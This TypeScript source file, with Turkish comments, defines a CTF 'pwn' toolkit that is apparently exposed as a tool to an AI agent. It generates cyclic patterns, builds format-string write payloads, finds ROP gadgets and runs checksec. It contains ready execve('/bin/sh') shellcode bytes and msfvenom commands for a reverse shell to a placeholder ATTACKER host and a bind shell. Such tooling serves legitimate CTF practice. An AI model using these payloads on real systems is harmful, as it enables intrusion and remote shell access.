/**
 * @fileoverview Fetih CTF PWN Toolkit
 * Cyclic pattern (de Bruijn), format string exploit generator, shellcode templates,
 * ROP gadget arama (ROPgadget veya objdump fallback), checksec.
 */

import { existsSync } from 'fs';
import { execFileSync } from 'child_process';
import type { ToolDefinition, ToolResult } from '../../types.js';

// ─── 1. Cyclic Pattern (de Bruijn B(26, n)) ──────────────────────────────────

/** pwntools-uyumlu cyclic alphabet ve length=4 ile uniqueness garantisi. */
export function cyclicPattern(length: number, alphabet = 'abcdefghijklmnopqrstuvwxyz'): string {
  // De Bruijn sequence B(k, n) where k = alphabet length, n = subseq length
  // Burada n=4 (uniqueness 26^4 = 456,976 byte'a kadar)
  const k = alphabet.length;
  const n = 4;
  const a: number[] = new Array(k * n).fill(0);
  const sequence: number[] = [];

  function db(t: number, p: number): void {
    if (sequence.length >= length) return;
    if (t > n) {
      if (n % p === 0) {
        for (let i = 1; i <= p; i++) {
          if (sequence.length >= length) return;
          sequence.push(a[i]!);
        }
      }
    } else {
      a[t] = a[t - p]!;
      db(t + 1, p);
      for (let j = a[t - p]! + 1; j < k; j++) {
        a[t] = j;
        db(t + 1, t);
      }
    }
  }

  db(1, 1);
  return sequence.slice(0, length).map(i => alphabet[i]).join('');
}

/** EIP/RIP value (little-endian 4 byte) verince offset bul. */
export function cyclicFind(value: number | string, length = 4096): number {
  let target: string;
  if (typeof value === 'number') {
    // Little-endian byte sırası
    const bytes: number[] = [];
    let v = value >>> 0;
    for (let i = 0; i < 4; i++) { bytes.push(v & 0xFF); v >>>= 8; }
    target = String.fromCharCode(...bytes);
  } else {
    target = value;
  }
  const pattern = cyclicPattern(length);
  return pattern.indexOf(target);
}

// ─── 2. Format String Exploit Generator ──────────────────────────────────────

/** %X$n payload üretici — printf format string vuln için arbitrary write. */
export function formatStringWrite(addr: number, value: number, offset: number, archBits: 32 | 64 = 64): string {
  // Basit byte-byte yazım: 4 ya da 8 byte adresleri sırayla yaz
  // Production için pwntools fmtstr_payload kullanılır; bu basit template
  const addrSize = archBits / 8;
  const addrBytes: number[] = [];
  let a = addr;
  for (let i = 0; i < addrSize; i++) { addrBytes.push(a & 0xFF); a = Math.floor(a / 256); }
  const addrStr = addrBytes.map(b => `\\x${b.toString(16).padStart(2, '0')}`).join('');
  return [
    `# Format string write template:`,
    `# Hedef adres: 0x${addr.toString(16)}, değer: 0x${value.toString(16)}, offset: ${offset}`,
    `# Pwntools'da:`,
    `from pwn import *`,
    `payload = fmtstr_payload(${offset}, {0x${addr.toString(16)}: 0x${value.toString(16)}})`,
    `# Manuel basit template (1 byte):`,
    `payload = b"${addrStr}" + b"%${value & 0xFF}c%${offset}\\$hhn"`,
  ].join('\n');
}

/** Format string offset bulma — programa "%p.%p.%p..." gönderdiğinde stack'tan kontrolün hangi pozisyonda olduğu. */
export function formatStringOffsetTemplate(): string {
  return [
    '# Format string offset bulma:',
    '# 1. AAAA%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p gönder',
    '# 2. Çıktıda "0x41414141" hangi pozisyondaysa offset = o pozisyon',
    '# Pwntools:',
    'from pwn import *',
    'p = process("./vuln")  # veya remote("host", port)',
    'p.sendline(b"AAAA" + b".".join([f"%{i}$p".encode() for i in range(1, 20)]))',
    'print(p.recvline())',
  ].join('\n');
}

// ─── 3. Shellcode Templates ──────────────────────────────────────────────────

const SHELLCODES = {
  'linux/x64/execve_sh': {
    bytes: '\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05',
    description: 'Linux x64 execve("/bin/sh", NULL, NULL) — 23 byte',
    sizeBytes: 23,
  },
  'linux/x86/execve_sh': {
    bytes: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
    description: 'Linux x86 execve("/bin/sh", NULL, NULL) — 23 byte',
    sizeBytes: 23,
  },
  'linux/x64/reverse_shell': {
    bytes: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o sc.bin',
    description: 'Linux x64 reverse shell — msfvenom ile üret (host/port değişken)',
    sizeBytes: 74,
  },
  'linux/x86/bind_shell': {
    bytes: 'msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f raw -o sc.bin',
    description: 'Linux x86 bind shell — msfvenom ile üret',
    sizeBytes: 78,
  },
};

export function getShellcode(name: string): { bytes: string; description: string; sizeBytes: number } | null {
  return (SHELLCODES as Record<string, { bytes: string; description: string; sizeBytes: number }>)[name] ?? null;
}

export function listShellcodes(): string[] {
  return Object.keys(SHELLCODES);
}

// ─── 4. ROP Gadget arama (ROPgadget veya objdump fallback) ───────────────────

function commandExists(cmd: string): boolean {
  try { execFileSync('which', [cmd], { stdio: 'ignore' }); return true; } catch { return false; }
}

export function findRopGadgets(filePath: string, maxGadgets = 50): { ok: boolean; output: string; source: string } {
  if (!existsSync(filePath)) return { ok: false, output: 'Dosya bulunamadı', source: 'none' };

  // ROPgadget kuruluysa
  if (commandExists('ROPgadget')) {
    try {
      const out = execFileSync('ROPgadget', ['--binary', filePath], {
        encoding: 'utf8', timeout: 30_000, maxBuffer: 8 * 1024 * 1024,
      });
      const lines = out.split('\n').slice(0, maxGadgets + 5);
      return { ok: true, output: lines.join('\n'), source: 'ROPgadget' };
    } catch (err) {
      return { ok: false, output: `ROPgadget hatası: ${String(err).slice(0, 200)}`, source: 'ROPgadget' };
    }
  }

  // Fallback: objdump + regex
  if (commandExists('objdump')) {
    try {
      const out = execFileSync('objdump', ['-d', '-M', 'intel', filePath], {
        encoding: 'utf8', timeout: 30_000, maxBuffer: 16 * 1024 * 1024,
      });
      // Basit "pop reg; ret" gadget pattern
      const lines = out.split('\n');
      const gadgets: string[] = [];
      for (let i = 0; i < lines.length - 1 && gadgets.length < maxGadgets; i++) {
        const line = lines[i]!;
        const next = lines[i + 1]!;
        // pop X; ret pattern
        const popMatch = line.match(/^\s+([0-9a-f]+):\s+pop\s+(\w+)/);
        const retMatch = next.match(/^\s+[0-9a-f]+:\s+ret\b/);
        if (popMatch && retMatch) {
          gadgets.push(`0x${popMatch[1]}: pop ${popMatch[2]}; ret`);
        }
        // ret pattern (tek başına ret de gadget)
        const soloRet = line.match(/^\s+([0-9a-f]+):\s+ret\b/);
        if (soloRet && !popMatch) {
          gadgets.push(`0x${soloRet[1]}: ret`);
        }
      }
      const output = gadgets.length > 0
        ? `# objdump fallback (${gadgets.length} gadget):\n${gadgets.join('\n')}\n\n# Daha kapsamlı arama için: pip install ROPgadget`
        : 'Hiç gadget bulunamadı (objdump fallback)';
      return { ok: gadgets.length > 0, output, source: 'objdump' };
    } catch (err) {
      return { ok: false, output: `objdump hatası: ${String(err).slice(0, 200)}`, source: 'objdump' };
    }
  }

  return { ok: false, output: 'Ne ROPgadget ne objdump kurulu', source: 'none' };
}

// ─── 5. Checksec emulator (readelf çıktısından) ──────────────────────────────

export function checksec(filePath: string): {
  ok: boolean;
  arch: string;
  nx: 'enabled' | 'disabled' | 'unknown';
  pie: 'pie' | 'no-pie' | 'unknown';
  relro: 'full' | 'partial' | 'no' | 'unknown';
  canary: 'yes' | 'no' | 'unknown';
  notes: string[];
} {
  const result = {
    ok: false, arch: 'unknown',
    nx: 'unknown' as const, pie: 'unknown' as const, relro: 'unknown' as const, canary: 'unknown' as const,
    notes: [] as string[],
  };
  if (!existsSync(filePath)) { result.notes.push('Dosya bulunamadı'); return result; }
  if (!commandExists('readelf')) { result.notes.push('readelf yok'); return result; }

  try {
    const headOut = execFileSync('readelf', ['-h', '-l', '-d', filePath], { encoding: 'utf8', timeout: 10_000 });
    const archMatch = headOut.match(/Machine:\s+(.+)/);
    const arch = archMatch ? archMatch[1]!.trim() : 'unknown';
    const isPie = /Type:\s+DYN/.test(headOut);
    const nx = /GNU_STACK[^\n]*\bRWE\b/.test(headOut) ? 'disabled' as const
      : /GNU_STACK[^\n]*\bRW\b/.test(headOut) ? 'enabled' as const
      : 'unknown' as const;
    const fullRelro = /GNU_RELRO/.test(headOut) && /BIND_NOW/.test(headOut);
    const partialRelro = /GNU_RELRO/.test(headOut) && !fullRelro;
    const relro = fullRelro ? 'full' as const : partialRelro ? 'partial' as const : 'no' as const;

    let canary: 'yes' | 'no' | 'unknown' = 'unknown';
    if (commandExists('nm')) {
      try {
        const nmOut = execFileSync('nm', ['--dynamic', filePath], { encoding: 'utf8', timeout: 10_000 });
        canary = /__stack_chk_fail/.test(nmOut) ? 'yes' : 'no';
      } catch { /* skip */ }
    }

    return {
      ok: true, arch,
      nx, pie: isPie ? 'pie' as const : 'no-pie' as const,
      relro, canary,
      notes: [],
    };
  } catch (err) {
    result.notes.push(`readelf hatası: ${String(err).slice(0, 150)}`);
    return result;
  }
}

// ─── Tool Tanımı ─────────────────────────────────────────────────────────────

export const ctfPwnTool: ToolDefinition = {
  name: 'ctf_pwn',
  description:
    'CTF PWN/Exploit toolkit. Eylemler: cyclic (pattern üret), cyclic_find (offset bul), ' +
    'fmt_string (format string exploit template), shellcode (shellcode listesi/al), ' +
    'rop (ROP gadget arama), checksec (NX/PIE/RELRO/Canary). ' +
    'Buffer overflow, format string, ROP chain için kullan.',
  inputSchema: {
    type: 'object',
    properties: {
      action: {
        type: 'string',
        enum: ['cyclic', 'cyclic_find', 'fmt_string', 'shellcode', 'shellcode_list', 'rop', 'checksec'],
      },
      length: { type: 'number', description: 'cyclic için pattern uzunluğu (varsayılan 256)' },
      value: { type: 'string', description: 'cyclic_find için 4-byte EIP value (0xdeadbeef veya "abcd")' },
      addr: { type: 'number', description: 'fmt_string için yazılacak adres' },
      writeValue: { type: 'number', description: 'fmt_string için yazılacak değer' },
      offset: { type: 'number', description: 'fmt_string için stack offset' },
      arch: { type: 'number', enum: [32, 64], description: 'fmt_string mimari (varsayılan 64)' },
      shellcode: { type: 'string', description: 'shellcode adı: linux/x64/execve_sh, linux/x86/execve_sh, vb.' },
      path: { type: 'string', description: 'rop ve checksec için binary path' },
    },
    required: ['action'],
  },
  isDestructive: false,
  requiresConfirmation: false,

  async execute(input: Record<string, unknown>): Promise<ToolResult> {
    const action = String(input['action'] ?? '');

    switch (action) {
      case 'cyclic': {
        const len = Number(input['length'] ?? 256);
        const pattern = cyclicPattern(len);
        return { output: `# Cyclic pattern (${len} byte):\n${pattern}`, isError: false };
      }
      case 'cyclic_find': {
        const v = String(input['value'] ?? '');
        const len = Number(input['length'] ?? 4096);
        const numVal = v.startsWith('0x') ? parseInt(v, 16) : v;
        const offset = cyclicFind(numVal as number | string, len);
        return {
          output: offset >= 0
            ? `Offset bulundu: ${offset} (decimal), 0x${offset.toString(16)} (hex)`
            : `Offset bulunamadı (pattern uzunluğu ${len}'ten az değer ya da yanlış endian)`,
          isError: false,
        };
      }
      case 'fmt_string': {
        const addr = Number(input['addr'] ?? 0);
        const wv = Number(input['writeValue'] ?? 0);
        const off = Number(input['offset'] ?? 0);
        const arch = (Number(input['arch'] ?? 64) === 32 ? 32 : 64) as 32 | 64;
        if (addr === 0 || off === 0) {
          return { output: formatStringOffsetTemplate(), isError: false };
        }
        return { output: formatStringWrite(addr, wv, off, arch), isError: false };
      }
      case 'shellcode_list':
        return { output: 'Mevcut shellcode\'lar:\n' + listShellcodes().map(n => `  • ${n}`).join('\n'), isError: false };
      case 'shellcode': {
        const name = String(input['shellcode'] ?? '');
        const sc = getShellcode(name);
        if (!sc) return { output: `Bilinmeyen shellcode: ${name}. Liste için action=shellcode_list`, isError: true };
        return {
          output: [
            `# ${name} (${sc.sizeBytes} byte)`,
            `# ${sc.description}`,
            sc.bytes,
          ].join('\n'),
          isError: false,
        };
      }
      case 'rop': {
        const path = String(input['path'] ?? '');
        if (!path) return { output: 'path gerekli', isError: true };
        const r = findRopGadgets(path);
        return { output: `# Kaynak: ${r.source}\n${r.output}`, isError: !r.ok };
      }
      case 'checksec': {
        const path = String(input['path'] ?? '');
        if (!path) return { output: 'path gerekli', isError: true };
        const c = checksec(path);
        const lines = [
          '┌─ CHECKSEC ──────────────────────────────────────────────────┐',
          `│ Mimari : ${c.arch}`,
          `│ NX     : ${c.nx}${c.nx === 'disabled' ? ' ⚠️ stack executable' : ''}`,
          `│ PIE    : ${c.pie}${c.pie === 'no-pie' ? ' ⚠️ statik adresler' : ''}`,
          `│ RELRO  : ${c.relro}`,
          `│ Canary : ${c.canary}${c.canary === 'no' ? ' ⚠️ stack canary yok' : ''}`,
          '└─────────────────────────────────────────────────────────────┘',
        ];
        if (c.notes.length > 0) lines.push(...c.notes.map(n => `  ${n}`));
        return { output: lines.join('\n'), isError: !c.ok };
      }
      default:
        return { output: `Bilinmeyen eylem: ${action}`, isError: true };
    }
  },
};
